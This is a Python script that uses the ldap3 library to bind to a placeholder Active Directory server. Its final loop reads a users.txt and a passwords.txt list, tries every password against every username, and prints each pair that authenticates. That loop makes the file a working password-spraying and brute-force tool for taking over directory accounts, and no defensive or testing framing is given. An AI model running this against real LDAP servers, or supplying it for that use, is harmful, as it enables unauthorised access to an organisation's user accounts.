from ldap3 import Server, Connection, ALL, NTLM, ALL_ATTRIBUTES, LEVEL, SUBTREE, ServerPool
import time


AUTH_LDAP_SERVER_URI = ['ldap://xxx.com:389']
AUTH_LDAP_BIND_DM = '@xxx.com'
AUTH_LDAP_SEARCH_BASE = "dc=xxx,dc=com"


class Ldap3Util(object):

    def __init__(self, user_info, ldap_setting):
        self.username = user_info['username']+ldap_setting['AUTH_LDAP_BIND_DM']
        self.password = user_info['password']
        self.attributes = user_info['attributes']
        self.ldap_conn = None
        self.AUTH_LDAP_SEARCH_BASE = ldap_setting['AUTH_LDAP_SEARCH_BASE']
        self.AUTH_LDAP_BIND_DM = ldap_setting['AUTH_LDAP_BIND_DM']
        self.ldap_server_pool = ServerPool(ldap_setting['AUTH_LDAP_SERVER_URI'], active=2)

    def __open_ldap(self):
        count = 0
        while count < 3:
            count += 1
            if self.ldap_conn is None:
                try:
                    self.ldap_conn = Connection(self.ldap_server_pool,
                                                user=self.username,
                                                password=self.password,
                                                check_names=True,
                                                lazy=False,
                                                receive_timeout=30,
                                                raise_exceptions=True)
                except Exception as e:
                    import traceback
                    traceback.print_exc()
                    time.sleep(1)
            else:
                break

    def auth_ldap(self):
        try:
            self.__open_ldap()
            self.ldap_conn.open()
            return self.ldap_conn.bind()
        except:
            # import traceback
            # traceback.print_exc()
            return None

    @staticmethod
    def init_ldap(username, password):
        try:
            attributes = ['cn', 'givenName', 'mail', 'sAMAccountName', 'department', 'name', 'telephoneNumber']
            userinfo = {'username': username, 'password': password, 'attributes': attributes}
            ldap_setting = {'AUTH_LDAP_SERVER_URI': AUTH_LDAP_SERVER_URI,
                            'AUTH_LDAP_SEARCH_BASE': AUTH_LDAP_SEARCH_BASE,
                            'AUTH_LDAP_BIND_DM': AUTH_LDAP_BIND_DM}
            return Ldap3Util(userinfo, ldap_setting)
        except Exception as e:
            import traceback
            traceback.print_exc()
            return None


with open('users.txt', 'r') as f:
    users = f.readlines()

with open('passwords.txt', 'r') as f:
    passwords = f.readlines()

for p in passwords:
    p = p.strip()
    for u in users:
        u = u.strip()
        ldap = Ldap3Util.init_ldap(u, p)
        if ldap.auth_ldap():
            print('[+] success, %s, %s' % (u, p))
        else:
            print('fail')
